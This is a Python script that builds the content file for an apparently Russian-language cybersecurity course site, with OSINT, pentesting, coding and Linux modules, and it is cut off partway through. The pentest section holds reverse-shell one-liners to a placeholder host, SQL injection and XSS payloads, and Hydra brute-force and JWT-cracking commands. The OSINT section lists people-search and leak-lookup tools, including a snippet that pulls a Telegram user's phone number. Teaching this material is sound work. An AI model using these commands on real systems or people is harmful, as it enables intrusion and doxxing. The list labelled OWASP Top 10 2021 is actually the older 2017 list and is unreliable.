#!/usr/bin/env python3
"""
Generate expanded data.js for CyberDesacratio
10 modules, 108 submodules with rich content
"""

import os

def esc(s):
    """Escape string for JS template literal (backtick string)"""
    return s.replace('\\', '\\\\').replace('`', '\\`').replace('${', '\\${')

def code_block(text):
    """Wrap text in pre/code block"""
    return f'<pre><code>{esc(text)}</code></pre>'

def html_content(sections):
    """Build HTML content from list of (tag, content) pairs"""
    html = ''
    for tag, content in sections:
        if tag == 'h3':
            html += f'\n                    <h3>{content}</h3>'
        elif tag == 'p':
            html += f'\n                    <p>{content}</p>'
        elif tag == 'ul':
            items = ''.join(f'\n                        <li>{item}</li>' for item in content)
            html += f'\n                    <ul>{items}\n                    </ul>'
        elif tag == 'ol':
            items = ''.join(f'\n                        <li>{item}</li>' for item in content)
            html += f'\n                    <ol>{items}\n                    </ol>'
        elif tag == 'pre':
            html += f'\n                    {code_block(content)}'
        elif tag == 'note':
            html += f'\n                    <p><em>{content}</em></p>'
    return html

def make_submodule(title, sections):
    """Create a submodule dict"""
    content = html_content(sections)
    return f'''            {{
                title: '{title}',
                content: `{content}
                `
            }}'''

def make_module(mod_id, icon, title, desc, count, submodules):
    """Create a module entry"""
    subs = ',\n'.join(submodules)
    return f'''    {{
        id: '{mod_id}',
        icon: '{icon}',
        title: '{title}',
        desc: '{desc}',
        count: '{count}',
        submodules: [
{subs}
        ]
    }}'''

# ============================================================
# MODULE 1: OSINT (14 submodules)
# ============================================================
osint_subs = [
    make_submodule('🔍 Основы OSINT', [
        ('h3', 'Что такое OSINT?'),
        ('p', 'OSINT (Open Source Intelligence) — разведка по открытым источникам. Это сбор и анализ информации из общедоступных источников: сайты, соцсети, форумы, утекшие базы, документы, изображения, метаданные.'),
        ('h3', 'Ключевые принципы'),
        ('ul', [
            '<strong>Легальность</strong> — только открытые данные, никакого взлома',
            '<strong>Верификация</strong> — перекрёстная проверка из 3+ источников',
            '<strong>Автоматизация</strong> — скрипты и тулы для массового сбора',
            '<strong>Анализ</strong> — данные → информация → выводы → отчёт',
            '<strong>OPSEC</strong> — не свети свои методы и источники',
        ]),
        ('h3', 'Этапы OSINT-исследования'),
        ('ol', [
            'Определение цели и задач',
            'Сбор исходных данных (name, email, username, phone)',
            'Поиск по открытым источникам',
            'Анализ и верификация',
            'Оформление результатов',
        ]),
        ('p', 'OSINT — это не про хакерство. Это про умение гуглить, анализировать и соединять точки.'),
    ]),
    make_submodule('🛠️ Инструменты OSINT', [
        ('h3', 'Топ инструментов'),
        ('ul', [
            '<strong>Maltego</strong> — визуализация связей (графы, трансформы)',
            '<strong>Shodan</strong> — поиск устройств в интернете',
            '<strong>theHarvester</strong> — сбор email, поддоменов, IP',
            '<strong>Recon-ng</strong> — фреймворк для веб-разведки',
            '<strong>SpiderFoot</strong> — автоматический сканер (200+ модулей)',
            '<strong>Creepy</strong> — геолокация по фото',
            '<strong>Telegram OSINT</strong> — поиск по чатам и юзерам',
            '<strong>Google Dorks</strong> — продвинутый поиск',
        ]),
        ('h3', 'Установка'),
        ('pre', '# Kali Linux — всё предустановлено\n# Для установки на Arch:\nsudo pacman -S maltego theharvester recon-ng\n\n# Python-инструменты\npip install holehe social-analyzer InstaLoad maigret'),
    ]),
    make_submodule('📝 Google Dorks', [
        ('h3', 'Что такое Google Dorks?'),
        ('p', 'Специальные операторы поиска для точного нахождения информации. Позволяют находить то, что не предназначено для публичного просмотра.'),
        ('h3', 'Основные операторы'),
        ('pre', 'site:example.com       — поиск по сайту\nfiletype:pdf           — поиск по типу файла\nintitle:"admin"        — поиск в заголовке\ninurl:admin            — поиск в URL\nintext:"пароль"        — поиск в тексте\n"@" + "example.com"    — поиск email\nlink:example.com       — кто ссылается'),
        ('h3', 'Примеры доров'),
        ('pre', '# Найти папки с бэкапами\nintitle:"index of" /backup\n\n# Найти PDF с отчётами\nsite:target.com filetype:pdf confidential\n\n# Найти уязвимые страницы\ninurl:php?id= site:target.com\n\n# Найти логи\nfiletype:log site:target.com\n\n# Найти камеры\ninurl:"view/view.shtml"'),
    ]),
    make_submodule('👤 Поиск людей', [
        ('h3', 'Методы поиска'),
        ('ul', [
            '<strong>По username</strong> — namechk, whatsmy.name, knowem, maigret',
            '<strong>По email</strong> — holehe, emailrep.io, hunter.io',
            '<strong>По телефону</strong> — getcontact, truecaller, numverify',
            '<strong>По соцсетям</strong> — Facebook, VK, LinkedIn, Telegram, Instagram',
            '<strong>По форумам</strong> — Google "username site:forum.ru"',
        ]),
        ('h3', 'Проверка утечек'),
        ('ul', [
            'haveibeenpwned.com — проверка email',
            'leakcheck.io — поиск по утечкам',
            'dehashed.com — агрегатор утечек',
            'scylla.so — база утечек',
        ]),
        ('pre', '# Поиск username через maigret\nmaigret username\n\n# Проверка email через holehe\nholehe email@example.com'),
    ]),
    make_submodule('📧 Email OSINT', [
        ('h3', 'Поиск и проверка email'),
        ('ul', [
            '<strong>Emailrep.io</strong> — репутация email',
            '<strong>Hunter.io</strong> — поиск email по домену',
            '<strong>Holehe</strong> — проверка регистраций по email',
            '<strong>Have I Been Pwned</strong> — утечки паролей',
        ]),
        ('h3', 'Формат email: паттерны'),
        ('pre', '# Стандартные паттерны\nivan.ivanov@company.com\ni.ivanov@company.com\nivanov@company.com\nivan.i@company.com\n\n# Генерация\nusername@domain.com\nfirst.last@domain.com'),
        ('p', 'Используй hunter.io для поиска email-формата компании, затем holehe для проверки.'),
    ]),
    make_submodule('🌐 Социальные сети', [
        ('h3', 'OSINT в соцсетях'),
        ('ul', [
            '<strong>Telegram</strong> — @username, чаты, каналы, Telegram API, Telegcrack',
            '<strong>VK</strong> — открытые профили, группы, фотографии, VK API',
            '<strong>Instagram</strong> — профили, истории, геолокация',
            '<strong>Facebook</strong> — профили, группы, фотографии, друзья',
            '<strong>Twitter/X</strong> — твиты, репосты, подписчики',
            '<strong>LinkedIn</strong> — карьера, контакты, компании',
        ]),
        ('h3', 'Инструменты'),
        ('pre', '# Telegram\npip install telethon\n# VK\npip install vk_api\n# Мульти-поиск\npip install maigret'),
    ]),
    make_submodule('📸 Фото и геолокация', [
        ('h3', 'Поиск по изображениям'),
        ('ul', [
            '<strong>Google Images</strong> — обратный поиск',
            '<strong>Yandex Images</strong> — альтернативный поиск',
            '<strong>Tineye</strong> — поиск по копиям',
            '<strong>ExifTool</strong> — чтение метаданных',
        ]),
        ('h3', 'Геолокация'),
        ('ul', [
            '<strong>GeoGuessr</strong> — тренировка',
            '<strong>Google Earth</strong> — спутниковые снимки',
            '<strong>Overpass Turbo</strong> — OpenStreetMap запросы',
            '<strong>Creepy</strong> — геолокация по фото',
        ]),
        ('pre', '# Извлечь метаданные\nexiftool photo.jpg\n\n# Удалить метаданные\nexiftool -all= photo.jpg'),
    ]),
    make_submodule('🏢 Поиск по компаниям', [
        ('h3', 'Разведка компаний'),
        ('ul', [
            '<strong>Rusprofile</strong> — юрлица РФ, ЕГРЮЛ',
            '<strong>Spark-Interfax</strong> — аналитика компаний',
            '<strong>Crunchbase</strong> — стартапы, инвестиции',
            '<strong>LinkedIn</strong> — сотрудники, структура',
            '<strong>Glassdoor</strong> — отзывы сотрудников',
        ]),
        ('h3', 'Домены и хостинг'),
        ('ul', [
            '<strong>Whois</strong> — регистрационные данные доменов',
            '<strong>Shodan</strong> — устройство и серверы компании',
            '<strong>BuiltWith</strong> — технологии сайта',
            '<strong>DNS Dumpster</strong> — DNS-разведка',
        ]),
        ('pre', '# Whois\nwhois example.com\n\n# DNS\nnslookup example.com\ndig example.com ANY'),
    ]),
    make_submodule('🔗 Связи и графы', [
        ('h3', 'Построение связей'),
        ('p', 'Люди, email, телефоны, адреса, никнеймы — всё это точки в графе. Задача OSINT-исследователя — соединить эти точки.'),
        ('ul', [
            '<strong>Maltego</strong> — визуальные графы с трансформами',
            '<strong>Obsidian</strong> — заметки с графом связей',
            '<strong>Gephi</strong> — продвинутая визуализация графов',
            '<strong>yEd Graph Editor</strong> — ручное построение',
        ]),
        ('p', 'Техника: найди аккаунт → извлеки связи → добавь в граф → ищи пересечения.'),
    ]),
    make_submodule('📱 Telegram OSINT', [
        ('h3', 'Разведка в Telegram'),
        ('ul', [
            '<strong>Поиск юзеров</strong> — @username, phone -> TG',
            '<strong>Телеграм чаты</strong> — поиск по сообщениям (Telegcrack, tgstat.ru)',
            '<strong>Каналы</strong> — аналитика (tgstat.ru, tgindex)',
            '<strong>Telegram API</strong> — MTProto, Telethon, pyrogram',
            '<strong>Утечки</strong> — зеркала утекших баз TG',
        ]),
        ('pre', '# Telethon CLI\nfrom telethon import TelegramClient\nclient = TelegramClient(\'session\', api_id, api_hash)\nclient.start()\n\n# Получить информацию о юзере\nuser = client.get_entity(\'@username\')\nprint(user.phone)'),
    ]),
    make_submodule('🗄️ Утечки и базы данных', [
        ('h3', 'Утекшие базы'),
        ('ul', [
            '<strong>Have I Been Pwned</strong> — 11B+ записей',
            '<strong>LeakCheck</strong> — 10B+ записей',
            '<strong>Dehashed</strong> — поиск по email/username/ip',
            '<strong>Snusbase</strong> — поиск по утечкам',
            '<strong>Scylla.so</strong> — бесплатный поиск',
        ]),
        ('h3', 'Поиск по утечкам (легально)'),
        ('ul', [
            'Проверяй только свои email/username',
            'Используй haveibeenpwned.com (легально и бесплатно)',
            'Не скачивай и не распространяй базы — это незаконно',
        ]),
    ]),
    make_submodule('🕵️ Обратный поиск', [
        ('h3', 'Обратный поиск по данным'),
        ('ul', [
            '<strong>По фото</strong> — Google Images, Yandex, Tineye, PimEyes',
            '<strong>По телефону</strong> — truecaller, getcontact, numverify',
            '<strong>По email</strong> — holehe, emailrep.io, hunter.io',
            '<strong>По username</strong> — maigret, namechk, whatsmy.name',
            '<strong>По адресу</strong> — Google Maps, кадастр',
        ]),
        ('pre', '# maigret — поиск по username\npip install maigret\nmaigret username\n\n# holehe — проверка email\nholehe email@example.com'),
    ]),
    make_submodule('📊 Анализ данных', [
        ('h3', 'Обработка результатов'),
        ('ul', [
            '<strong>jq</strong> — парсинг JSON в терминале',
            '<strong>pandas</strong> — анализ табличных данных',
            '<strong>Excel/Google Sheets</strong> — ручной анализ',
            '<strong>Obsidian</strong> — структурирование заметок',
        ]),
        ('pre', '# Конвертация JSON в таблицу\ncat data.json | jq -r \'.[] | [.email, .username] | @tsv\' > data.tsv'),
        ('h3', 'Визуализация'),
        ('ul', [
            '<strong>Maltego</strong> — графы связей',
            '<strong>Gephi</strong> — сложные графы',
            '<strong>Kibana</strong> — дашборды (если есть ELK)',
        ]),
    ]),
    make_submodule('⚖️ Этика OSINT', [
        ('h3', 'Правила этичного OSINT'),
        ('ul', [
            'Используй только открытые данные',
            'Не публикуй личные данные без согласия',
            'Не используй OSINT для вреда, шантажа или доксинга',
            'Соблюдай законы своей страны',
            'Не социа́льная инженерия — это уже не OSINT',
            'Верифицируй информацию из 3+ источников',
        ]),
        ('p', 'OSINT — это инструмент. Как и любой инструмент, он может быть использован во благо или во вред. Выбор за тобой.'),
        ('p', '<strong>Золотое правило:</strong> не делай другим того, чего не хочешь себе.'),
    ]),
]

# ============================================================
# MODULE 2: Пентестинг (12 submodules)
# ============================================================
pentest_subs = [
    make_submodule('📖 Основы пентеста', [
        ('h3', 'Что такое пентест?'),
        ('p', 'Penetration Testing — легальная имитация атаки на систему с целью поиска уязвимостей. От настоящей атаки отличается наличием договора и рамок.'),
        ('h3', 'Этапы (PTES)'),
        ('ol', [
            'Reconnaissance — разведка (пассивная и активная)',
            'Scanning — сканирование портов, сервисов, уязвимостей',
            'Exploitation — эксплуатация уязвимостей',
            'Privilege Escalation — повышение прав',
            'Post-Exploitation — закрепление, сбор данных',
            'Reporting — отчёт',
        ]),
        ('h3', 'Методологии'),
        ('ul', [
            '<strong>OWASP WSTG</strong> — веб-пентест',
            '<strong>PTES</strong> — стандарт пентеста',
            '<strong>OSSTMM</strong> — профессиональный стандарт',
            '<strong>NIST SP 800-115</strong> — государственный стандарт',
        ]),
    ]),
    make_submodule('🔧 Инструменты', [
        ('h3', 'Базовый набор'),
        ('ul', [
            '<strong>Nmap</strong> — сканер портов',
            '<strong>Metasploit</strong> — фреймворк эксплойтов',
            '<strong>Burp Suite</strong> — перехват HTTP/HTTPS',
            '<strong>Hydra</strong> — брутфорс паролей',
            '<strong>Wireshark</strong> — анализ трафика',
            '<strong>John/Hashcat</strong> — взлом хэшей',
            '<strong>Gobuster/ffuf</strong> — перебор директорий',
            '<strong>Netcat/ncat</strong> — швейцарский нож',
        ]),
        ('pre', '# Установка на Kali (всё предустановлено)\n# Дополнительно:\nsudo apt install ffuf seclists\npip install impacket bloodhound'),
    ]),
    make_submodule('🎯 Практика (легально)', [
        ('h3', 'Полигоны'),
        ('ul', [
            '<strong>HackTheBox</strong> — реалистичные машины, лабы',
            '<strong>TryHackMe</strong> — обучение с нуля, комнаты',
            '<strong>VulnHub</strong> — уязвимые VM для загрузки',
            '<strong>PentesterLab</strong> — веб-пентест по подписке',
            '<strong>OverTheWire</strong> — Linux-задания (Bandit)',
            '<strong>PortSwigger Web Academy</strong> — бесплатно',
        ]),
        ('p', '<strong>Совет:</strong> начни с TryHackMe — там структурированное обучение. Затем переходи на HTB.'),
    ]),
    make_submodule('📋 OWASP Top 10', [
        ('h3', 'Топ-10 веб-уязвимостей 2021'),
        ('ol', [
            'Injection (SQL, NoSQL, OS)',
            'Broken Authentication',
            'Sensitive Data Exposure',
            'XML External Entities (XXE)',
            'Broken Access Control',
            'Security Misconfiguration',
            'Cross-Site Scripting (XSS) — Reflected, Stored, DOM',
            'Insecure Deserialization',
            'Components with Known Vulnerabilities',
            'Insufficient Logging & Monitoring',
        ]),
        ('p', 'Каждая уязвимость имеет CWE-номер и описание на owasp.org. Изучай их все.'),
    ]),
    make_submodule('💉 SQL Injection', [
        ('h3', 'SQLi — база веб-пентеста'),
        ('p', 'SQL Injection — внедрение SQL-кода через пользовательский ввод. Одна из самых старых и опасных уязвимостей.'),
        ('h3', 'Типы SQLi'),
        ('ul', [
            '<strong>In-band</strong> — Error-based, Union-based',
            '<strong>Blind</strong> — Boolean-based, Time-based',
            '<strong>Out-of-band</strong> — DNS/HTTP exfiltration',
        ]),
        ('h3', 'Примеры'),
        ('pre', "# Union-based\n' UNION SELECT username,password FROM users--\n\n# Blind boolean\n' OR 1=1--\n' OR '1'='1\n\n# Time-based\n' WAITFOR DELAY '0:0:5'--"),
        ('p', 'Практикуйся на SQLInjection.com, PortSwigger labs.'),
    ]),
    make_submodule('🌐 XSS (Cross-Site Scripting)', [
        ('h3', 'Типы XSS'),
        ('ul', [
            '<strong>Reflected XSS</strong> — одноразовый, в URL',
            '<strong>Stored XSS</strong> — сохраняется на сервере',
            '<strong>DOM-based XSS</strong> — через клиентский JS',
        ]),
        ('h3', 'Payloads'),
        ('pre', '<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<a href="javascript:alert(1)">click</a>\n\n# Обход фильтров\n<ScRiPt>alert(1)</ScRiPt>\n%3Cscript%3Ealert(1)%3C/script%3E'),
        ('p', 'Используй Burp Suite для перехвата и модификации запросов при поиске XSS.'),
    ]),
    make_submodule('🔑 Аутентификация', [
        ('h3', 'Уязвимости аутентификации'),
        ('ul', [
            '<strong>Брутфорс</strong> — нет ограничения попыток',
            '<strong>Weak passwords</strong> — слабые пароли',
            '<strong>Session fixation</strong> — фиксация сессии',
            '<strong>JWT уязвимости</strong> — none algorithm, weak secret',
            '<strong>2FA bypass</strong> — обход двухфакторки',
        ]),
        ('pre', '# Брутфорс с Hydra\nhydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"\n\n# JWT crack\npython jwt_tool.py <token> -C -d rockyou.txt'),
    ]),
    make_submodule('🐚 Shell и Reverse Shell', [
        ('h3', 'Получение доступа'),
        ('p', 'После эксплуатации нужно получить shell. Reverse shell — цель сама подключается к твоей машине.'),
        ('h3', 'Reverse Shell One-liners'),
        ('pre', '# Bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n# Python\npython -c \'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n\n# Netcat\nnc -e /bin/sh 10.0.0.1 4444'),
        ('p', 'Поднимай listener: <code>nc -lvnp 4444</code>'),
    ]),
    make_submodule('🚀 Privilege Escalation', [
        ('h3', 'Повышение прав (Linux)'),
        ('ul', [
            '<strong>SUID биты</strong> — find / -perm -4000 2>/dev/null',
            '<strong>Sudo -l</strong> — что можно запустить от root',
            '<strong>Kernel exploits</strong> — CVE, dirty pipe, etc.',
            '<strong>Capabilities</strong> — getcap -r / 2>/dev/null',
            '<strong>CRON jobs</strong> — задачи по расписанию',
            '<strong>Linenum/LinPEAS</strong> — автоматические скрипты',
        ]),
        ('pre', '# LinPEAS\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n\n# SUID поиск\nfind / -type f -perm -4000 2>/dev/null'),
    ]),
    make_submodule('🌐 Web Recon', [
        ('h3', 'Веб-разведка'),
        ('ul', [
            '<strong>Subdomain enumeration</strong> — subfinder, amass, assetfinder',
            '<strong>Directory busting</strong> — ffuf, gobuster, dirsearch',
            '<strong>Param discovery</strong> — arjun, paramspider',
            '<strong>JS analysis</strong> — LinkFinder, JSParser',
            '<strong>Tech detection</strong> — whatweb, wappalyzer',
        ]),
        ('pre', '# Subdomain scan\nsubfinder -d example.com | httpx\n\n# Directory busting\nffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\n\n# Param discovery\narjun -u https://example.com/api.php'),
    ]),
    make_submodule('📝 Отчётность', [
        ('h3', 'Структура отчёта'),
        ('ul', [
            '<strong>Executive Summary</strong> — для руководства (без технических деталей)',
            '<strong>Scope</strong> — что тестировалось',
            '<strong>Methodology</strong> — как проводился пентест',
            '<strong>Findings</strong> — найденные уязвимости (CVSS score)',
            '<strong>PoC</strong> — доказательство эксплуатации (скриншоты, логи)',
            '<strong>Recommendations</strong> — как исправить',
            '<strong>Timeline</strong> — когда что делалось',
        ]),
        ('p', 'Инструменты: <strong>Serpico</strong>, <strong>Ghostwriter</strong>, или просто LaTeX/Word. CVSS v3.1 — стандарт оценки.'),
    ]),
    make_submodule('🛡️ Защита', [
        ('h3', 'Как защищаться'),
        ('ul', [
            '<strong>Input validation</strong> — валидация всего ввода',
            '<strong>Prepared statements</strong> — никакой конкатенации SQL',
            '<strong>Content Security Policy (CSP)</strong> — защита от XSS',
            '<strong>Rate limiting</strong> — защита от брутфорса',
            '<strong>WAF</strong> — Web Application Firewall',
            '<strong>Regular updates</strong> — патчи безопасности',
            '<strong>Сканируй себя сам</strong> — найди уязвимости до хакеров',
        ]),
        ('p', 'Знание атак — лучшешая защита. Учись у атакующих, чтобы защищать.'),
    ]),
]

# ============================================================
# MODULE 3: Программирование (16 submodules)
# ============================================================
coding_subs = [
    make_submodule('🐍 Python', [
        ('h3', 'Мой основной язык'),
        ('p', 'Python — для всего: боты, парсеры, скрипты, тулы, автоматизация, пентест.'),
        ('h3', 'Полезные библиотеки'),
        ('ul', [
            '<strong>requests/aiohttp</strong> — HTTP-запросы',
            '<strong>BeautifulSoup/lxml</strong> — парсинг HTML/XML',
            '<strong>aiogram</strong> — Telegram-боты (новички)',
            '<strong>pandas</strong> — работа с данными',
            '<strong>asyncio</strong> — асинхронность',
            '<strong>argparse/click</strong> — CLI-аргументы',
            '<strong>scapy</strong> — работа с пакетами',
            '<strong>paramiko</strong> — SSH',
        ]),
        ('pre', '# Пример: простой парсер\nimport requests\nfrom bs4 import BeautifulSoup\n\nurl = "https://example.com"\nr = requests.get(url)\nsoup = BeautifulSoup(r.text, \'html.parser\')\nfor h2 in soup.find_all(\'h2\'):\n    print(h2.text.strip())'),
    ]),
    make_submodule('🌐 JavaScript/Node.js', [
        ('h3', 'Фронтенд и бэкенд'),
        ('ul', [
            '<strong>Vanilla JS</strong> — анимации, интерактив, canvas',
            '<strong>Node.js + Express</strong> — сервера, API',
            '<strong>SQLite/PostgreSQL</strong> — базы данных',
            '<strong>React/Vue</strong> — SPA-фреймворки',
        ]),
        ('h3', 'Полезные концепции'),
        ('ul', [
            'Асинхронность: callbacks → promises → async/await',
            'REST API — архитектура запросов',
            'JWT — аутентификация',
            'WebSocket — real-time',
        ]),
        ('pre', '// Простой Express-сервер\nconst express = require(\'express\')\nconst app = express()\napp.get(\'/\', (req, res) => res.send(\'Hello\'))\napp.listen(3000)'),
    ]),
    make_submodule('🐚 Bash / Shell', [
        ('h3', 'Автоматизация в Linux'),
        ('pre', '#!/bin/bash\n# Бэкап директории\nbackup_dir="/var/backups"\ntimestamp=$(date +%Y%m%d_%H%M%S)\ntar -czf "${backup_dir}/backup_${timestamp}.tar.gz" /home/user'),
        ('h3', 'Полезные команды'),
        ('ul', [
            '<code>grep</code>, <code>sed</code>, <code>awk</code> — обработка текста',
            '<code>find</code> — поиск файлов',
            '<code>xargs</code> — массовые операции',
            '<code>sort</code>, <code>uniq</code> — сортировка, уникальные',
            '<code>cron</code> / <code>systemd timers</code> — планировщик',
        ]),
    ]),
    make_submodule('📐 Best Practices', [
        ('h3', 'Как писать хороший код'),
        ('ul', [
            '<strong>DRY</strong> — Don\'t Repeat Yourself',
            '<strong>KISS</strong> — Keep It Simple, Stupid',
            '<strong>YAGNI</strong> — You Ain\'t Gonna Need It',
            '<strong>SOLID</strong> — принципы ООП',
            'Пиши README — документируй',
            'Используй .env для секретов',
            'Git — commit часто, push регулярно',
            'Code review — чужие глаза видят баги',
        ]),
    ]),
    make_submodule('🗄️ Базы данных', [
        ('h3', 'SQL и NoSQL'),
        ('ul', [
            '<strong>SQLite</strong> — встраиваемая, для мелких проектов',
            '<strong>PostgreSQL</strong> — мощная, для серьёзных проектов',
            '<strong>MySQL</strong> — популярная, много хостингов',
            '<strong>Redis</strong> — in-memory кэш, очереди',
            '<strong>MongoDB</strong> — документная NoSQL',
        ]),
        ('pre', '-- Создание таблицы\nCREATE TABLE users (\n    id SERIAL PRIMARY KEY,\n    username VARCHAR(50) UNIQUE,\n    email VARCHAR(100),\n    created_at TIMESTAMP DEFAULT NOW()\n);\n\n-- CRUD\nINSERT INTO users (username, email) VALUES (\'admin\', \'admin@site.com\');\nSELECT * FROM users WHERE username = \'admin\';'),
    ]),
    make_submodule('🌍 API и REST', [
        ('h3', 'REST API дизайн'),
        ('ul', [
            '<strong>GET /resource</strong> — список',
            '<strong>GET /resource/:id</strong> — один элемент',
            '<strong>POST /resource</strong> — создать',
            '<strong>PUT /resource/:id</strong> — обновить',
            '<strong>DELETE /resource/:id</strong> — удалить',
        ]),
        ('h3', 'Аутентификация в API'),
        ('ul', [
            '<strong>JWT (JSON Web Token)</strong> — самый популярный',
            '<strong>OAuth2</strong> — сторонняя авторизация',
            '<strong>API Key</strong> — простые ключи',
            '<strong>Basic Auth</strong> — только для тестов',
        ]),
        ('pre', '# Пример JWT в Python\nimport jwt\ntoken = jwt.encode({"user_id": 1}, "secret_key", algorithm="HS256")\ndecoded = jwt.decode(token, "secret_key", algorithms=["HS256"])'),
    ]),
    make_submodule('🔒 Безопасность кода', [
        ('h3', 'Ошибки безопасности'),
        ('ul', [
            '<strong>Не доверяй вводу</strong> — все данные от юзера — зло',
            '<strong>SQL Injection</strong> — используй ORM или prepared statements',
            '<strong>XSS</strong> — экранируй вывод',
            '<strong>CSRF</strong> — используй токены',
            '<strong>Не храни секреты в коде</strong> — .env, vault',
            '<strong>Rate limiting</strong> — защита от DDoS/брутфорса',
        ]),
    ]),
    make_submodule('🐙 Git', [
        ('h3', 'Команды Git'),
        ('pre', 'git init\n# или\ngit clone <url>\n\ngit add .\ngit commit -m "message"\ngit push origin main\n\ngit pull\ngit fetch\n\ngit log --oneline --graph --all\ngit diff\ngit checkout -b feature\n\ngit merge feature\ngit rebase -i HEAD~3'),
        ('h3', 'Workflow'),
        ('ul', [
            'main/stable — только стабильный код',
            'dev/develop — разработка',
            'feature/* — новые фичи',
            'fix/* — исправления',
            'commit часто, но осмысленно',
        ]),
    ]),
    make_submodule('🧪 Тестирование', [
        ('h3', 'Виды тестов'),
        ('ul', [
            '<strong>Unit тесты</strong> — тестирование одной функции',
            '<strong>Integration тесты</strong> — взаимодействие модулей',
            '<strong>E2E тесты</strong> — полный сценарий',
            '<strong>Regression тесты</strong> — регрессия после изменений',
            '<strong>Security тесты</strong> — безопасность',
        ]),
        ('pre', '# Python pytest\nimport pytest\n\ndef add(a, b):\n    return a + b\n\ndef test_add():\n    assert add(2, 3) == 5\n    assert add(-1, 1) == 0\n\n# Запуск\n# pytest test.py'),
    ]),
    make_submodule('🐳 Docker', [
        ('h3', 'Основы Docker'),
        ('pre', '# Dockerfile\nFROM python:3.11-slim\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install -r requirements.txt\nCOPY . .\nCMD ["python", "main.py"]'),
        ('pre', '# Сборка и запуск\ndocker build -t myapp .\ndocker run -d --name myapp -p 8000:8000 myapp\n\ndocker ps -a\ndocker logs myapp\ndocker exec -it myapp sh\n\ndocker compose up -d\ndocker compose down'),
    ]),
    make_submodule('🛠️ CI/CD', [
        ('h3', 'Автоматизация сборки'),
        ('ul', [
            '<strong>GitHub Actions</strong> — CI/CD для GitHub',
            '<strong>GitLab CI</strong> — для GitLab',
            '<strong>Jenkins</strong> — классический CI/CD',
            '<strong>Drone CI</strong> — простой, контейнерный',
        ]),
        ('h3', 'Пример GitHub Actions'),
        ('pre', '# .github/workflows/deploy.yml\nname: Deploy\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - run: pip install -r requirements.txt\n      - run: pytest'),
    ]),
    make_submodule('📝 Алгоритмы', [
        ('h3', 'Must-know алгоритмы'),
        ('ul', [
            '<strong>Сортировки</strong> — quick sort, merge sort, bubble sort',
            '<strong>Поиск</strong> — binary search, BFS, DFS',
            '<strong>Структуры</strong> — linked list, stack, queue, hash table, tree',
            '<strong>Динамика</strong> — DP, knapsack, LCS',
            '<strong>Графы</strong> — Dijkstra, Floyd-Warshall, A*',
        ]),
        ('pre', '# Binary Search (Python)\ndef binary_search(arr, x):\n    left, right = 0, len(arr) - 1\n    while left <= right:\n        mid = (left + right) // 2\n        if arr[mid] == x: return mid\n        elif arr[mid] < x: left = mid + 1\n        else: right = mid - 1\n    return -1'),
    ]),
    make_submodule('📦 Менеджеры пакетов', [
        ('h3', 'Экосистемы'),
        ('ul', [
            '<strong>pip</strong> — Python (requirements.txt)',
            '<strong>npm/yarn/pnpm</strong> — Node.js (package.json)',
            '<strong>cargo</strong> — Rust (Cargo.toml)',
            '<strong>go mod</strong> — Go (go.mod)',
            '<strong>pacman/yay</strong> — Arch Linux',
        ]),
        ('pre', '# pip\npip install requests\npip freeze > requirements.txt\npip install -r requirements.txt\n\n# npm\nnpm init -y\nnpm install express\nnpx create-react-app myapp'),
    ]),
    make_submodule('💡 Советы', [
        ('h3', 'Как прокачаться в коде'),
        ('ul', [
            'Пиши каждый день — хотя бы 30 минут',
            'Читай чужой код — open source проекты',
            'Решай задачи — LeetCode, CodeWars, HackerRank',
            'Участвуй в open source — найди баг и исправь',
            'Пиши утилиты для себя — automate everything',
            'Изучай разные языки — расширяет кругозор',
        ]),
    ]),
]

# ============================================================
# MODULE 4: Linux / Unix (14 submodules)
# ============================================================
linux_subs = [
    make_submodule('📀 Дистрибутивы', [
        ('h3', 'Мои дистрибутивы'),
        ('ul', [
            '<strong>Arch Linux</strong> — основной. Rolling release, полный контроль, AUR.',
            '<strong>Kali Linux</strong> — для пентеста. Всё предустановлено.',
            '<strong>Debian</strong> — для серверов. Стабильность, LTS.',
            '<strong>Ubuntu</strong> — популярный, много гайдов.',
            '<strong>Fedora</strong> — передовые технологии, RPM.',
        ]),
        ('p', 'Выбор дистрибутива — это выбор философии. Arch для контроля, Debian для стабильности.'),
    ]),
    make_submodule('⌨️ Команды (must know)', [
        ('h3', 'Навигация и файлы'),
        ('pre', '# Навигация\nls -la          # список\ncd /path        # переход\npwd             # где я\ntree            # дерево\n\n# Файлы\ncp -r src dst   # копировать\nmv src dst      # переместить\nrm -rf dir      # удалить\nchmod +x file   # сделать исполняемым\nln -s target link # симлинк'),
        ('pre', '# Процессы\nps aux          # все процессы\nhtop            # мониторинг\nkill -9 PID     # убить\n\n# Сеть\nip a            # интерфейсы\nss -tulpn       # порты\nping host       # проверка\nnetstat -tulpn  # классика'),
    ]),
    make_submodule('🐳 Docker на Linux', [
        ('h3', 'Установка Docker'),
        ('pre', '# Установка на Arch\nsudo pacman -S docker docker-compose\nsudo systemctl enable --now docker\nsudo usermod -aG docker $USER'),
        ('h3', 'Основные команды'),
        ('pre', 'docker run -d --name web -p 80:80 nginx\ndocker ps -a\ndocker logs -f web\ndocker exec -it web sh\ndocker cp file.txt web:/tmp/\ndocker compose up -d'),
    ]),
    make_submodule('🔐 Безопасность Linux', [
        ('h3', 'Базовая защита'),
        ('ul', [
            'Не работай под root — используй sudo',
            'Закрывай ненужные порты (ufw, iptables/nftables)',
            'SSH: отключи пароль, используй ключи, смени порт',
            'Fail2ban — защита от брутфорса',
            'Регулярные обновления: pacman -Syu / apt update && apt upgrade',
            'Audit: auditd, lynis, rkhunter, chkrootkit',
        ]),
        ('pre', '# UFW\nufw default deny\nufw allow 22/tcp\nufw enable\n\n# SSH加固\n# /etc/ssh/sshd_config\nPort 2222\nPasswordAuthentication no\nPermitRootLogin no'),
    ]),
    make_submodule('📦 Arch Linux', [
        ('h3', 'Arch — мой основной'),
        ('ul', [
